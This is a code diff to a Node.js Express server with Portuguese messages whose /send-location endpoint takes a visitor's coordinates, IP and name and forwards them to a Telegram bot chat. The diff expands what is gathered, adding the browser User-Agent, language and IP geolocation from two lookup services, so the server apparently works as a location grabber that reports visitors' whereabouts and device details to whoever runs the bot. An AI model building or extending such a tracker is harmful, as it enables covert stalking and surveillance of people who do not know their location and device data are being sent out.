@@ -31,35 +31,12 @@ app.get('/env.js', (req, res) => {
 });
 app.post("/send-location", async (req, res) => {
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  const userAgent = req.headers['user-agent'];
+  const language = req.headers['accept-language'];
   console.log("Localização recebida:");
   console.log("IP:", ip);
-  console.log("Body:", req.body);
-
-  const { latitude, longitude } = req.body;
-
-  if (!latitude || !longitude) {
-    return res.status(400).json({ success: false, message: "Latitude e Longitude são obrigatórias!" });
-  }
-
-  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
-
-  try {
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message,
-    });
-
-    res.status(200).json({ success: true });
-  } catch (error) {
-    console.error(error);
-    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
-  }
-});
-
-app.post("/send-location/ip", async (req, res) => {
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  console.log("Localização recebida:");
-  console.log("IP:", ip);
+  console.log("User-Agent:", userAgent);
+  console.log("Language:", language);
   console.log("Body:", req.body);
 
   const { latitude, longitude, name } = req.body;
@@ -73,7 +50,13 @@ app.post("/send-location/ip", async (req, res) => {
     const response = await axios.get(`https://ipapi.co/${ip}/json/`);
     locationData = response.data;
   } catch (err) {
-    console.error("Erro ao obter info do IP:", err.message);
+    console.error("Erro ao obter info do IP (ipapi.co):", err.message);
+    try {
+      const fallback = await axios.get(`http://ip-api.com/json/${ip}`);
+      locationData = fallback.data;
+    } catch (fallbackErr) {
+      console.error("Fallback IP lookup failed:", fallbackErr.message);
+    }
   }
 
   const message = `📍 Nova Localização Recebida:
@@ -81,10 +64,12 @@ app.post("/send-location/ip", async (req, res) => {
 🌍 IP: ${ip}
 🧭 Latitude: ${latitude}
 🧭 Longitude: ${longitude}
+📱 User-Agent: ${userAgent || 'Não disponível'}
+🗣️ Idioma: ${language || 'Não disponível'}
 🏙️ Cidade: ${locationData.city || 'Desconhecida'}
-📍 Região: ${locationData.region || 'Desconhecida'}
-🌐 País: ${locationData.country_name || 'Desconhecido'}
-📡 Operadora: ${locationData.org || 'Desconhecida'}`;
+📍 Região: ${locationData.region || locationData.regionName || 'Desconhecida'}
+🌐 País: ${locationData.country_name || locationData.country || 'Desconhecido'}
+📡 Operadora: ${locationData.org || locationData.isp || 'Desconhecida'}`;
 
   try {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
